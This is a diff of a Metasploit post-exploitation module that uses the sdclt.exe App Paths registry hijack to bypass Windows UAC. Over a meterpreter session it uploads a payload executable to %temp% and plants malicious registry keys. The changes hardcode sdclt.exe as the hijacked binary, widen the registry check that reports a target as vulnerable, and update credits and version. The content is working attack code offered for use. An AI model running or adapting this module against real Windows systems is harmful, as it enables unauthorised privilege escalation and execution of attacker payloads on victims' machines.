@@ -47,7 +47,6 @@
 # Input the payload name to be uploaded           => set PAYLOAD_NAME payload.exe
 # The destination path were to deploy payload     => set DEPLOY_PATH %temp%
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
-# The vulnerable software to be hijacked ()?      => set VULN_SOFT sdclt.exe
 # Check target vulnerability settings/status?     => set CHECK_VULN true
 # Delete malicious registry hive keys/values?     => set DEL_REGKEY true
 #
@@ -119,11 +118,12 @@ class MetasploitModule < Msf::Post
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover: enigma0x3 | mattifestation',  # credits
+                                        'Vuln discover: enigma0x3 | mattifestation',  # POC/vuln credits
+                                        'Specialthanks: 0xyg3n [SSA Red Team]',       # help debugging
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
-                        'DisclosureDate' => 'abr 21 2017',
+                        'Version'        => '$Revision: 1.5',
+                        'DisclosureDate' => 'abr 26 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',     # thats no need for privilege escalation..
@@ -142,7 +142,6 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
                                          'SESSION' => '1',  # Default its to run againts session 1
-                                         'VULN_SOFT' => 'sdclt.exe',  # Default its to run againts sdclt.exe
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -159,8 +158,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false]),
-                                OptBool.new('VULN_SOFT', [ false, 'The vulnerable soft to be hijacked (eg osk.exe)' , false])
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
                         ], self.class)
 
         end
@@ -175,7 +173,7 @@ def ls_hijack
 
   r=''
   session = client
-  hija_soft = datastore['VULN_SOFT'] # sdclt.exe
+  hija_soft = "sdclt.exe"
   upl_path = datastore['LOCAL_PATH'] # /root/payload.exe
   dep_path = datastore['DEPLOY_PATH'] # %temp%
   pay_name = datastore['PAYLOAD_NAME'] # payload.exe
@@ -348,11 +346,10 @@ def ls_vulncheck
 
   r=''
   session = client
+  hija_soft = "sdclt.exe"
   oscheck = client.fs.file.expand_path("%OS%")
-  hija_soft = datastore['VULN_SOFT'] # sdclt.exe
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
-  vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # hijacking reg key
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -372,8 +369,16 @@ def ls_vulncheck
     print_warning("Reading process registry hive keys ..")
     Rex::sleep(2.0)
     if registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe")
-      report_tw = "VULNERABLE (hive key found)"
+      vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"
+      report_tw = "VULNERABLE (hijack reg key found)"
+    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths")
+      vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
+      report_tw = "POSSIBLE VULNERABLE (hive 'App Paths' found)"
+    elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion")
+      vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion"
+      report_tw = "POSSIBLE VULNERABLE (hive 'CurrentVersion' found)"
     else
+      vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion"
       report_tw = "NOT VULNERABLE (hive not found)"
     end
 
